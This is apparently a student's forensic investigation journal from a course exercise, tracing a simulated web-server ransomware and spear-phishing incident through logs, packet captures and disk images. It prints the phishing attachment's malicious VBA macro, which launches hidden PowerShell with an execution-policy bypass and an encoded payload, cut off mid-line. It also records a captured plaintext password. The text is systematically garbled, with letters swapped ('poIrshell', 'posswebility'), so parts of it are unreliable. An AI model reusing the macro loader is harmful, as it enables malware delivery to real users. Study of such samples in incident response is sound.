@@ -1,0 +1,430 @@
+*** Note: I was lacking 2 pre-reqs when I took this course. I look back at this and I can tell I got distracted by noise and missed some important things. Not bad for a first-timer though!
+
+
+2017/11/11 - Yamin
+16:05 - I've uploaded logs into Splunk and I're trying to figure out what could have happened
+
+16:17 - I searched the logs for any POST requests that Ire made to see if there was
+a brute force attack. Moreover, I filtered for file = "wp-login.php" method = POST
+and I found that one unique clientip and it was 143.215.32.89. This clientip made 1 GET and 3 posts. I will investigate what this client ip has been up to by filtering for everything
+that is not wp-login.php on POST requests by filtering for file != "wp-login.php" method = POST
+
+16:25 - I looked at uri path for all of those events and there Ire three different ones. I proceeded to go to wp-admin/admin-ajax.php in the http docs. which when opening the file in a text editor rendered some Iird symbols. I go to the command line and use file to see what kind of file it is and it's Non-ISO extended-ASCII text. I are currently investigating how to display the contents of the file in a readable format.
+
+16:35 - I looked at the 2 other uri paths, async-upload.php and post.php, and they are both in the same format the file above. I are very curious to what the contents of the files are. I are researching how I can convert the files' contents into plain text. iconv -f "format of file" -t utf-8 "name of file you're converting". I still have gweberish text. also doing file -i post.php, enca -L none post.php, uchardet post.php. I have decided to move on from this because Chris, a systems administrator, reported that the web server was crypto lockered and it shouldn't be surprising if some files are unreadable.
+
+----------------------------------------------------------------------------------------
+2017/11/14 - Yamin
+
+14:25 - (in error.log.2 archive) server shutting down, but I need to look into the event that states "Removed temporary tablespace data file: "webtmp1" ".
+
+14:28 - look into the following event
+2:01:09.607 PM
+2017-10-28T18:01:09.607093Z 0 [Note] InnoDB: Setting file './webtmp1' size to 12 MB. Physically writing the file full; Please wait ...
+
+14:34 - look into the following event. someone tried to fetch the information schema of the database
+10/28/17
+2:01:09.883 PM
+2017-10-28T18:01:09.883231Z 0 [Note] Executing 'SELECT * FROM INFORMATION_SCHEMA.TABLES;' to get a list of tables using the deprecated partition engine. You may use the startup option '--disable-partition-engine-check' to skip this check.
+----------------------------------------------------------------------------------------
+2017/11/17 - Yamin
+
+13:00 - I need to ask the system administrators how many events are in the web server logs because I am getting 2 conflicting counts when I index the web_server.tar.gz archive into Splunk. Investigating history.log in /var/log/apt/.
+
+13:43 - I am curious to know what is being purged from the terminal right before AWS is being installed. This occurs on 7/21/2017 at 14:51:56. Everything else seems normal because someone is just upgrading packages and their Ubuntu system and then installing packages.
+
+13:50 - Investigating error logs .1 - .7 in /var/log/apache2/. tid stands for (thread id). More importantly, I am curious to know what is shutting down by 7 SIGTERMs on 10/22/17 (3 of them) and 10/28/17 (4 of them). What processes is a user killing? There are also 7 invalid commands commands of the user injecting hex into terminal and that is where the SIGTERMs' are arising from?
+
+Solution: The SIGTERMs' each have a different id from the invalid commands that Ire entered. This means that they can not be correlated because different pids' equate to different processes.
+
+14:10 - Investigating unattended-upgrades.log in /var/log/unattended-upgrades. I see events in which the system is upgrading the packages through a script. Someone has configured blacklisted packages and whitelisted packages.
+
+14:20 - Re-investigating error logs that Hunter and I slightly Int over on 11/14. Investigating error logs .1 - .7 in /var/log/mysql where sourcetype = "error.log-too_small"
+
+14:26 - I notice several weird events in error.log.7 on 10/22/2017 (page 3). The root is being denied access several times. Everything else seems normal.
+
+14:37 - Many Iird events going on. The file, ./webtmp, is being written to (12 mb). This could be a script. Also, some user is trying to get a list of the tables in the database.
+
+15:00 - Investigating sourcetype="error.log-2". I see a bunch of plugins being shut down, and notice the sequence number 3900291 for a complete shutdown on 10/24/2017 at 02:50:57. Immediately after this event, webtmp is removed? The file has then been set again at 02:51:01 on 10/24/2017. Also, SSL setup failed at 02:51:01 on 10/24/2017.
+
+15:30 - The user is trying to receive a list of the tables in the database by executing 'SELECT * FROM INFORMATION_SCHEMA.TABLES;'. This happens twice within these set of logs.
+----------------------------------------------------------------------------------------
+2017/11/18 - Yamin
+
+13:00 - Investigating sourcetype="access.log-too_small" in /var/log/apache2. There is a POST request that is sending /wp-admin/install.php on 10/22/17 at 15:28:57 and another one at 15:29:48. There's another POST request with /wp-login.php at 15:30:31.
+
+----------------------------------------------------------------------------------------
+2017/11/20 - Yamin
+
+23:35 - Going back to history.log in /var/log/apt/ because I believe I missed something important. I'm seeing that a lot of these upgrades are occurring through ubuntu (1000) which is a user under ubuntu (fetching packages through a local mirror). 0 is usually root and 1 is usually a user.
+
+HoIver, on 10/29/17 @ 18:34:49, I see Bob with user id 1002 is installing netcat through the command "apt install netcat-traditional". Netcat is not usually installed on ubuntu and it is used to make TCP connections. Also known as a hacker's tool. This is very suspicious.
+
+Additionally, Bob installs python which is known as a scripting language. He does so on 10/29/17 @ 19:32:00.
+
+Asked the system administrators the following: "Is Bob a North American Lumber Coalition employee? If so, why is he downloading tools that are not installed on ubuntu such as netcat and python? In other words, do NALC employees use these tools for their daily operations?"
+
+23:40 - The system administrators provided us with the network architecture of North American Lumber Coalition. They have stated that mail and web are on two different interfaces. Additionally, you must go through internal servers instead of going through DMZ. It is as follows:
+
+        $ Workstations/clients (connects to routers/firewalls):10.0.3.0/24
+        $ Routers/Firewalls: Connects to the internet, internal servers, DMZ, and workstations
+        $ Internal Servers (connects to routers/firewalls): 10.0.2.0/24
+        $ DMZ (connects to the internet): 10.0.0.0/24
+
+23:45 - Looking at the events in both kern.log and ufw.log (filtering for ufw b/c it's a firewall log and gives us an idea of ip addresses), I can see that the DST ip is consistently 10.0.0.14. Moreover, the name of something is "ip-10-0-0-14 kernel" Going to ask the system administrators if this is the ip address of the web server.
+----------------------------------------------------------------------------------------
+2017/11/21 - Yamin
+
+00:00 - The system administrators provided us with 2 packet captures to analyze the network data of the router and web server. Specifically router.pcap and webserver.pcap. I will stop analzying these logs because I am not getting anywhere and can not determine much of anything. I need to build a timeline of the attack and know who all is sending or receiving network traffic. I will first analyze webserver.pcap and then move on to router.pcap.
+
+00:15 - As I'm inspecting the webserver.pcap, I filter for http because I am concerned for traffic that is going to and from the web server such as GET and POST requests. I know the web server was crypto-lockered so I need to narrow down on when this happened. I see a HTTP GET response status code 304 right before the GET request for netcat (Bob installing netcat-traditional).
+
+304 is status code for not modified and the date and time for that response is 10/29/2017 @ 18:20:46 GMT. GMT is Greenwich Mean Time and they are 5 hours ahead of PST. This tells us that attack must have happened after because the data is not encrypted.
+
+00:17 - I follow the HTTP stream for Bob's GET request for netcat-traditional and it's encrypted. This occurred on 10/29/2017 @ 10:42:29 GMT. src ip = 10.0.0.14 and dst ip = 54.191.55.41 (status code = 200).
+
+EDIT: it may not be encrypted. gotta check.
+
+00:20 - There are some responses that are not encrypted (HTML code) after the initial packet I inspected (Bob's apt install netcat). Shouldn't all requests after be encrypted? Reported to sys. admins.
+
+EDIT: Some of the files that I thought Ire encrypted Ire actually just binary files...rookie mistake.
+
+00:40 - There is a GET request with src ip = 143.215.32.82 to the web server 10.0.0.14 and as it's response, it allows the user to upload a file to the server. This is very bad. The file is upload.php and it is not encrypted. This occurred on 10/29/2017 @ 19:14:25 GMT.
+
+01:00 - The client is receiving something from the server. src ip = 10.0.0.14 and the dst is 52.1.52.89. This file is encrypted. Another ip to be on the look out for. There are events in which the web server is sending something to this client on GET requests which is fishy.
+
+***01:05 - ip 143.215.32.82 is definitely suspicious because he/she is involved with yet another file on 10/29/2017 @ 19:24:55. I inspect another GET request from this client to the web server and it states "/upload/test.dump" was not found on this server". I open the file within the HTTP docs and it's encrypted.
+
+01:10 - Same src and dst ip as noted at 01:05 on 10/29/2017 @ 19:25:06 GMT. The contents of this packet seem to reveal a Microsoft Excel Spreadsheet with pertinent information to this investigation. The employee names are as listed:
+
+        1) Bob
+        2) Annie
+        3) Grace
+        4) Joe
+        5) Mary
+
+Their social security numbers are also present. Bob (uid = 1002) is a suspect in this investigation. I go to Splunk to filter for each one of their names separately and I only get results for Bob in which I have discovered in history.log. I will ask the system administrators for their ip address(es) and their affiliations within NALC.
+
+01:45 - There is another unique ip installing python lwebraries on a GET request on 10/28/2017 @ 22:08:16 GMT. src ip = 10.0.0.14 and dst ip = 54.213.249.49.
+
+01:50 - Yet again, ip 143.215.32.82 is involved on 10/29/2017 @ 19:33:06 GMT, but this time with an internal server error (status code == 500). When following the HTTP stream for this packet, there is information which states to email webmaster@localhost and that more info can be found in the server error logs. What would cause an internal server error?
+
+02:00 - I have client ip 52.1.52.89 receiving something from the server on a GET request? This is very fishy. The file is encrypted and I can not locate the day or time.
+
+02:10 - I have another unique ip, 24.125.35.143 that is associated with GET requests on 10/29/2017 @ 19:35:29 GMT. This client is also associated with internal server crashes(status code == 500).
+
+???02:30 - ip 54.191.55.41 sends a GET request on 10/30/2018 @ 05:36:59 which is not modified and the contents of the packets initially not encrypted, until you scroll down. Inspecting the contents in detail, I realize there is PGP signature.
+
+02:45 - Another unique ip, 91.189.91.26, is upgrading something in /ubuntu/dists/xenial-security/InRelease on 10/30/2017 @ 05:36:59
+
+03:00 - Client ips to look into:
+        $ 24.125.35.143
+        $ 52.1.52.89
+        $ 54.191.55.41
+        $ 54.213.249.49 (get python lwebraries)
+        $ 91.189.95.15
+        $ 91.189.95.26
+        $ 143.215.32.82 (upload.php, test.dump) -> very suspicious
+
+03:15 - The client and server are both NTP version 4.
+
+14:21 - Investigating router.pcap and there is another client ip that I have not yet encountered, 169.254.169.254 involved with a HTTP GET request@ 26:
+
+14:39 - NALC uses SMB protocol for file sharing services.
+
+14:40 - Requested Firewall logs from the system administrators.
+---------------------------------------------------------------------------------
+2017/11/22 - Yamin
+
+15:00 - System Administrators folloId up with the following information:
+
+        Bob is a web developer
+        Annie is the CEO
+        Grace is the head of web presence
+        Joe is the CFO
+        and Mary is a PR representative. Here are their workstation IPs:
+
+        10.0.3.15::Bob's Workstation
+        10.0.3.7::Joe's Workstation
+        10.0.3.108::Grace's Workstation
+        10.0.3.96::Annie's Workstation
+
+        Mary only uses her phone.
+
+
+    Bob said he has never used netcat and doesn't know what it does. This is certainly extremely suspicious.
+
+    webmaster@localhost doesn't have any inbound or outbound emails.
+
+    Lots of things can cause an internal server error. Generally this means something ran executable code that failed to fully execute.
+
+    Firewall Logs: https://www.dropbox.com/sh/px64wu8i3w639q9/AACA4Mqjy8A9GISTzMAkN880a?dl=0
+
+    Client ip, 143.215.32.82 is definitely suspicious.
+------------------------------------------------------
+
+17:30 - Requested all files shared through SMB servers from system administrators because there's some activity going on with that protocol.
+
+17:32 - ip 169.254.169.254 is requesting security credentials on a GET request to the server on 10/28/2017 @ 14:51:34. This ip is also associated with a 404 on 10/28/2017 @ 14:51:34 to this address  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd".
+
+EDIT: The above event is normal because dtd is a common thing. Has to do with HTML being verified or formatted into XML?
+
+17:34 - ip 72.21.91.29 is receiving something from internal server ip 10.0.2.195 on 10/29/2017 @ 18:58:53. The user agent is Microsoft-CryptoAPI/10.0 and the host is ocsp.digicert.com.
+
+EDIT: The above event is normal because it's part of the the OSCP protocol and Microsoft does so to verify certificates, hence the digicert.
+
+17:35 - I can see Bob working but I'm going to request the Splunk internal server logs from the system administrators. There is activity with 10.0.2.195, 10.0.2.244, etc.
+
+17:37 - Both Bob and workstation ip 10.0.3.92 (unknown) are requesting security credentials from 10/28/2017 @ 14:51:34 until 10/29/2017 @ 20:13:42. I'm going to request who's workstation the unknown client ip belongs to.
+
+17:40 - There's a lot of activity going on with the internal servers.
+
+18:00 - Bob has webmail from 10/28/2017 @ 14:56:48 to 10/29/2017 @ 14:09:34. Files such as main.php, login.php, signout.php. I have asked the system administrators for all client emails for all workstations.
+
+18:30 - Workstation ip 10.0.3.92 is involved with HEAD requests when installing Microsoft updates on 10/29/2017 @ 14:29:30.
+
+EDIT: The above event is normal.
+
+20:00 - 10.0.3.15 (Bob) is composing and sending mail to 10.0.0.41 (unknown at the moment) on 10/29/2017 @ 13:41:26. When I follow HTTP stream to inspect the details of this message, I see that the email was sent to Annie Smith and her email address is annie@northamericanlumbercoalition.com.
+
+The subject of the email reads "Proposed Salary structure" and the content of the email is as follows:
+
+        Annie,
+        Your spreadsheet didn't seem to work. Can you resend it to me or put it on the fireshare?
+
+        Thanks,
+        Bob
+
+First thing that is fishy is that Annie's workstation is 10.0.3.96 and the destination ip is 10.0.0.41. I will ask system administrators if any employees have more than one ip since DHCP is configured.
+
+Another thing that is fishy is I need to know what spreadsheet Annie sent Bob in the first place and explore activity occurs through fileshare (SMB servers, with SMB being the protocol) and ask the sys. admins for any and all files shared.
+
+20:10 - There is another email from Bob (10.0.3.15) to 10.0.0.41 on 10/29/2017 @ 13:55:36. The email was sent to Annie. It has the same subject as the email explored at 20:00 today. The content of the email is as follows:
+
+        Oh, I think there was some mail problem. It seems this was supposed to go to Joe instead.
+
+
+There a multitude of things that could have happened. I need more information to figure out what happened. Bob could have figured out what was wrong and resolved his problem. Annie could have sent the wrong spreadsheet in the first place or could have sent the wrong spreadsheet when she resent the email. Another posswebility is that Bob's workstation could be compromised this whole time. The best thing to do is to retrieve all emails from Bob, Annie, and Joe during this time frame (10/29/2017 @ 13:41:26 - 13:55:36) and all files exchanged betIen them, Specifically the files for these 2 emails.
+
+The next thing to do is analyze the last few http events in router.pcap and then explore smb activity.
+
+21:00 - Bob logs into his email at http://mail.northamericanlumbercoalition.com/webmail/src/login.php, twice because of two redirects. More importantly, I can see his login credentials which are as follows:
+
+        "Login-username" = "bob"
+        "secretkey" = "enamel-backpack52Nuncio"
+
+Ofcourse his login credentials are in plain text because of the HTTP protocol. Things are slowly coming together. There is a little suspicion that Bob's account could have been compromised.
+
+----------------------------------------------------------------------------------------
+2017/11/24 - Yamin
+
+The system administrators have responded with the following:
+
+    First, it's not unusual that Bob sent email to Annie but didn't connect to her workstation. When you send mail on a webmail system you go to the web server that runs webmail, which then sends mail to the mail server. Both of those are at 10.0.0.41. ---> I need to learn how webmail works.
+
+    Your request for email seems reasonable given that evidence. The mail logs are here:
+    https://www.dropbox.com/s/srhw0t4fhnifmc0/mail_server_logs.tar.gz?dl=0 I'll see if I can get full text of Bob's mailbox, but there may be privacy issues.
+
+    Bob's account being compromised looks reasonable. What would you check next if Bob's account is compromised?
+
+    Annie's workstation only has one IP: 10.0.3.96
+
+    GMT is 5 hours ahead of PST, but the events look place on 10/29 which would be Daylight Saving time in most of the US.
+---------------------------------------------------------
+21:00 - Since it was Daylight Saving time in most of the US, I are one hour ahead so the four hour difference betIen pcap in Splunk makes sense. Splunk logs state that Bob installed netcat at 18:34, but webserver.pcap says he downloaded it at 14:30. Additionally, Splunk says Bob installed python on 19:32, but webserver.pcap says 15:32.
+
+22:00 - I've requested the splunk server logs because there is a lot of activity going on with the internal servers in router.pcap. The system administrators have responded with "Unfortunately, the Splunk server was not working"
+
+The disk images are here:
+
+    Bob's workstation: https://www.dropbox.com/s/36c5tcdp3gy4u1z/bob_workstation?dl=0
+
+    Alternate link to Bob's disk image in the case you are having trouble downloading it: https://s3-us-Ist-2.amazonaws.com/cs-8803-final-project/Forensic+Images/bob_workstation
+
+    And the webserver: https://www.dropbox.com/s/8ay12w9i4mhmvke/web_server?dl=0
+
+----------------------------------------------------------------------------------------
+2017/11/26 - Yamin
+
+19:00 - Investigating the mail logs. Not finding anything worthwhile.
+
+20:41 - Asked the system administrators for the disk image for the mail server. If that doesn't exist, than I asked for them to provide me with the mail root (similar to the web root folder) because the mail logs aren't helpful.
+
+20:56 - System administrators replied with the following:
+
+    Here you go: https://www.dropbox.com/s/wpv5g0ebzb9hjk7/mail_root.tar.gz?dl=0
+
+20:57 - Investigating the mail root. Annie doesn't have any sent mail or mail in her trash which contradicts the emails she was involved in router.pcap. Her account could be spoofed. Let's look at Bob's activity.
+
+20:58 - Within .bash_history in folder 'bob', the following seems suspicious:
+
+        mkdir mail/.imap/INBOX
+        sudo su - grace
+        exit
+
+I am not sure why Grace is a super user under Bob's account or what this really means. Will consult the system administrators about this.
+
+20:59 - I am looking at Bob's sent mail (not the sent folder) and I see two of the emails that I found in router.pcap. The dates and times for those two emails located in router.pcap are on 10/29/2017 @ 17:41:16 and 17:55:26. I've confirmed these times with the dovecot.index.cache file in his sent folder. These times are 4 hours ahead of the times shown in router.pcap because of day light savings and GMT.
+
+Additionally, there is another email from Bob on 10/27/2017 @ 14:03:07 to Annie Smith with subject "Proposed salary structure" with the following contents:
+
+    The excel spreadsheet didn't seem to work. Could you resend it?
+
+21:10 - Looking at the last event in dovecot.index.cache in Bob's inbox, I see the following:
+
+    Content-Type: text/plain
+    \00\00\00\004\00\00\00\00\00\00\00\00\00\00Date: Thu, 26 Oct 2017 16:08:29 +0000 (UTC)
+    \00\00\00F\00\00\00\00\00\00\00\00\00\00From: "Annie Smith" <annie@northamericanlumbercoalition.com>
+    \00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00+\00\00\00\00\00\00\00\00\00\00Subject: Proposed salary structure
+    \00\00\00\00B\00\00\00\00\00\00\00\00\00\00To: "Joe Chandler" <joe@northamericanlumbercoalition.com>
+    \00\00\00\00\00\00\00\00\00\00\00\00��\00\00\00\00\00\00\00\00\00��Y�\00\00x\00\00\00\00\00\00\00\00\00\00\00\00T\00\00\00A\00\00\00\00\00\00\00\00\00#\00\00\00\00\00\00v�\00\00\00\00\00\00��\00\00\00\00\00\00\00\00\00@\00\00\00w\00\00\00\00\00\00�\00\00\00\00\00\00\00�\00\00\00\00\00\00\00
+    �\00\00\00\00\00\00�\00\00\00\00\00\00\00\00\00\00\00("application" "octet-stream" ("name" "NALC-salaries.xls") "<20171029173501.17199.1@ip-10-0-80-181.ec2.internal>" NIL "base64" 60954 NIL ("attachment" ("filename" "NALC-salaries.xls")) NIL NIL) "mixed" ("boundary" "952363535-1509298501=:17199") NIL NIL NIL\00\00\00\00
+
+
+I suspect that this email is suspicious because it is from Annie and is sent to Joe. However, this email is in Bob's inbox. It is also suspicious because Annie's sent folder is empty and Joe's inbox is empty and does not contain this email. It is also suspicious because it contains an attachment. Going to ask the system administrators for the email with subject "Proposed Salary Structure" from Annie Smith to Joe Chandler on 10/26/2017 at 16:08:29 as Ill as the attachment, "NALC-salaries.xls", in this email.
+
+I believe a spear phishing attack is posswebly targeting Bob. He could have been infected because he could have thought it was an important message from the CEO, Annie, and opened the attachment without inspecting it. I'm going to go back in the pcaps and see if anyone else in the company has had access to this spreadsheet. I should also check to see if there is a mail server pcap and inspect that as well.
+
+Also going to ask the system administrators for the event logs of the file server, domain controller, and the client workstations.
+
+Also going to ask the system administrators for the pcap file for the mail server, similar to the web server's pcap.
+
+22:06 - The system administrators replied with the following:
+
+    Here is the email (including attachments) that you requested: https://www.dropbox.com/s/sdf8wnrbgeapcpq/bobmail.txt?dl=0
+
+    Here are the events logs:
+    All desktop logs: https://www.dropbox.com/sh/7d84bzwjq0n7i91/AAB-tdZ3cad8LPVhEt3rYWOla?dl=0
+    All server logs: https://www.dropbox.com/sh/fueni6hno081ltc/AAB9xH4Q96boDyldn_tx0gMpa?dl=0
+
+    Here is a pcap from the mail server: https://www.dropbox.com/s/s5haz40wpsw3ovc/mailserver.pcap?dl=0
+
+
+23:08- Looking at the email that I've requested, I can see that the true sender of the email is ubuntu@cloudxlarge.com because that is the return path of the email. It was sent on 10/27/2017 @ 01:14:31 to Bob. I can now conclude that Joe's and Annie's email accounts Ire spoofed.
+
+I am going to convert the attachment to an xls file. First, I got rid of the invisweble new line characters in atom. Next I searched for decoding base 64 and recieved the output and saved it as an xls file. I then uploaded it into Virus Total and 23/59 engines detected this as malicious activity. The file is 34 kb. This file was created on 09/18/2017 and was last saved on 10/18/2017. The author was a Windows user.
+
+This file was last modified on 2017:10:29 @ 17:32:47
+
+PoIrshell code was definitely detected and this is what was flagged:
+
+        Sub Workbook_Open()
+        'VBA arch detect suggested by "T"
+        Dim C As String
+        Dim news2 As String
+        Dim e4 As String
+
+        Arch = Environ("PROCESSOR_ARCHITECTURE")
+        windir = Environ("windir")
+        If Arch = "AMD64" Then
+                C = windir + "\syswow64\windowspoIrshell\v1.0\poIrshell.exe"
+        Else
+                C = "poIrshell.exe"
+        End If
+
+        news2 = "nVRRb9pIEH7nV4ysPclWsHGApg1WpKakaXNXUi6kSe8QOi32gLesd5"
+        news2 = news2 + "31OphQ/vuNiY+kr/fi9Yxn5/tm5huzBziD905reiHlVZZrY1"
+        news2 = news2 + "1nhUah7HWDRErHm0FezqWIobDc0oGVpe9wpezYGrgTxpZcnk"
+        news2 = news2 + "upY7fxyfw8SQwWRRtKoSwk64l4wsZYPMdSKq1uN/mLe2y0xd"
+        news2 = news2 + "h60f/mMjTILd6mdCQvXJ7tc2uNmJcWX5GyPF49MzsEk8/YA/"
+        news2 = news2 + "uDe8wNz5CwDpf3WFTCpeTL15HPaFcJleG8b1mz2bKEOuycfx"
+        news2 = news2 + "hefLz89Pnq9z++jK6/jv+8mdx+u7v//tfffB4nuFim4sdKZk"
+        news2 = news2 + "rnD6aw5eO62jyFx91e/83J23enTnCrhyk358bwjeu1FqWKa3"
+        news2 = news2 + "SIXfbobcGgLakPrjsldtPZDNjjrzfgJ4yQF6VB/+v8B7UZ/E"
+        news2 = news2 + "mZeQE94DcIq+MwBB8f4LTr7V6yW9iyRc3eiY6DoPdzoam4OP"
+        news2 = news2 + "X1PgV9OzoDlkzdJVrfcJXoDPyMVyKjrCwJvqBa2tSb7aKGH1"
+        news2 = news2 + "tEr7IjbCE3OqZWw3bKa6IzVhEcPY6A/bOLAFVCFCpiX5AaGl"
+        news2 = news2 + "zYugrX/xk3e1wvUKQF19vtXgEst0CMwWXiLIyYAF9aOOnT29"
+        news2 = news2 + "GRt2UpIdmIrWrAhBAwAmgKpCsSBPFdUVxRB6Q1IxmBWwebLPS"
+        news2 = news2 + "88Dw5dpwiCbQzn9PH7N4fKnF6jDSZoHkWMY01jGXHFl2hmg0"
+        news2 = news2 + "HtRTNEY8VC0CbgHZci2ctpyKWckywJc8usKXEXsYyMayq4Gd"
+        news2 = news2 + "xkU1jMgjr9Pc6HUqCyUYtlwWcSHpoiIPm6Tlmg8QlPWacNzk"
+        news2 = news2 + "g/CSl5px+ExF9nOYHNJVU8mlx9hJPgOIJ7QX1cF3B96zlexB"
+        news2 = news2 + "SBLiOYfthY3Asqr9uQBRd6raTmyQW33HVSa/Ni0OkUlhoXxF"
+        news2 = news2 + "KXSSW5WdK7zgb9fq/TwebsdphzwWkxTBuLm11tPOsFsjuYCF0"
+        news2 = news2 + "KJ/bTYA/jXtGXgEJVe1wFfkVXkPEbYey6buRbg57wobGrKFq"
+        news2 = news2 + "vOmB4MfvkLhW2WN9prh1UvDEM6+qEXTZvW3ZTKigwDWlo0Om"
+        news2 = news2 + "+GVAQjboqUS5rQUOcbl+VtCNswfd7tmcsq2ikyel3X89pwAK"
+        news2 = news2 + "lLoyuvfz6E2GZVuz7Cevd0aX1VShLQ/gfjTyRiTiuIsSaFvz"
+        news2 = news2 + "vph+GOhBCn292/"
+
+        e4 = C + " -NoP -NonI -W Hidden -Exec Bypass -Co
+
+I will have to decode this powIrshell code later (ask for help on how to do this in ubuntu).
+
+
+00:00 - I am going to investigate mailserver.pcap, router.pcap, the server logs, and desktop logs to see if anyone else has been compromised.
+
+00:25 - Within mailserver.pcap, I can see Bob received the email from ubuntu@cloudxlarge.com on 10/29/2017 @ 17:38:02 UTC which is 13:38:03 EST with daylight savings. Annie's and Joe's emails Ire spoofed. Annie was in the FROM and Joe is in the TO. The attachment is also in the email. The subject reads "Proposed salary structure" The email is contents are as follows with the attachment omitted for brevity sake:
+
+    Here is the latest proposal for the new salary matrix.
+
+    thanks,
+
+      Annie
+
+Bob's webmail ip on the external network is 10.0.0.41. HoIver the contents of this email are different than the one the system administrators sent us.
+
+
+00:45 - Investigated mail.server pcap and there is no one else that had access to the attachment. I tried to investigate the File server logs, DC logs, and client workstation logs but I Ire unsuccessful in index them into Splunk in a meaningful way the logs Iren't in a readable format when I opened them up with a text editor.
+--------------------------------------------------------------------------------------
+2017/11/27 - Yamin
+
+15:00 - Investigating router.pcap to see if anyone else has been infected or have accessed the attachment. Filtered for "http and not ip.addr == 10.0.3.15" in Wireshark and I have not found anyone with mail or malicious attatchment.
+
+16:00 - Filtering for "smb and ip.addr == 10.0.3.15", I see that Bob is up to a lot of strange activity and I see a FY18 proposal.xls. The hacker probably knew something about this and that's maybe why he placed his malicious attack in a .xls file because the employees probably knew about this.
+
+16:30 - Bob creates a directory, HR, on 10/29/2017 13:46:27. The path is \HR\desktop.ini and I can see some important information when I follow the tcp stream such as Microsoft Excel 2003 which tells us they could be running Microsoft server 2003 and I see Root employee workbook which sounds important and sounds like the CEO should be the only one with access to that. There's a lot of information about employees and there is salary information as Ill.
+
+16:45 - on 10/29/2017 @ 13:46:27, I can see that Bob shared the malicious file in the HR folder, path \HR\NALC-salaries.xls (FID = 0x4007). When I inspect this file, it tells me that they're running Microsoft Server 2003. This must be why the hacker wrote a script in PoIrshell because Microsoft Server 2003 was very vulnerable (SMB, wanacrypt ransomware attack, etc (will look into this more)).The hacker was able to get information so easily because files on the fileshare Ire not encrypted. Now, all the updates in the previous logs make sense because Microsoft did roll out a lot of updates. The attacker must have put these in here because the CFO and CEO have access to them so removing this file is imperative so no one else gets infected.
+
+17:00 - Bob also creates a path Annual reviews within HR on 10/29/2017 @ 14:11:17. There is Bob
+
+17:15 - I can see another folder being created Grace Personal Stuff in HR on
+
+    Supporting evidence:
+
+    https://support.microsoft.com/en-us/help/4023262/how-to-verify-that-ms17-010-is-installed
+
+    https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
+
+
+18:30 - Asked the system administrators if NALC keeps backups of its systems and it does not keep any backups for any of its systems.
+
+18:45 - Asked the system administrators about the time zone on the web server logs. Easy way to find out is by the following:
+        To find out you can untar the log directory and do:
+
+        TZ=UTC ls -l syslog
+        tail -1 syslog
+
+        And see what the discrepancy is betIen the last log and the file time.
+
+
+19:00 - Re investigating web server logs and I see that in var(2)/log/auth.log I see that Bob (actually the hacker) connecting on malicious ports (4000, 4156, etc) on 10/29/2017 at various times (18:30, 19:05, etc). There seems to be a lot of malicious activity within this one log. Since times are not synchronized I will say the latest activity occurred on 19:41 which is
+
+19:10 - Found the contents of the file in a HTTP response on 10/29/2017 @ 13:38:48 which include the contents of the
+
+20:00 - The system administrators have given us both disk images of Bob's workstation and the web server.
+
+    Mounting Bob's Disk;
+    mount -t ntfs -o ro,loop,offset=$[2048*512] ./bob_workstation /mnt/bob
+
+    Mounting web Server:
+    mount -t ntfs -o ro,loop,offset=$[2048*512] ./web_server /mnt/web
+
+I need to index the files for a specific time (instructions on Iek 11 foresnics slides). I are going to start at 13:30:00 because that is a couple minutes before the email was received by Bob.
+
+    psort.exe -o l2tcsv -z EST5EDT --slice "2017-10-29 13:30:00" --slice_size 540 -w web_540.csv web.plaso
+
+    psort.exe -o l2tcsv -z EST5EDT --slice "2017-10-29 13:30:00" --slice_size 540 -w bob_540.csv bob.plaso
+
+
+Within bob_540.csv, the sha256 hash of the NALC-salaries.xls: a3d34d51817b12199d74ac7d95a058257167a3ed454d6688756f592faaae5b82. This occurred on 10/29/2017 @ 10:22:04 EST. I can see Bob downloaded this file on 10/29/2017 @ 12:37:50 through his webmail. Bob is sharing this file at 13:30.
+
+21:00 - In Bob's downloads on his disk image, he downloaded the file on 1:37pm. Moreover, Bob's password is revealed in ./shadow of /etc/ directory.
+
+21:05 - There's also an encrypt.py on the web server disk image which is what encrypted the files on the server in directory /mnt/web/tmp.
+
+21:40 - Looking into /mnt/web/etc/sudeors, I can see that Bob has root access. He should be removed from this list.
+---------------------------------------------------------------------------------------
+End of Investigation.
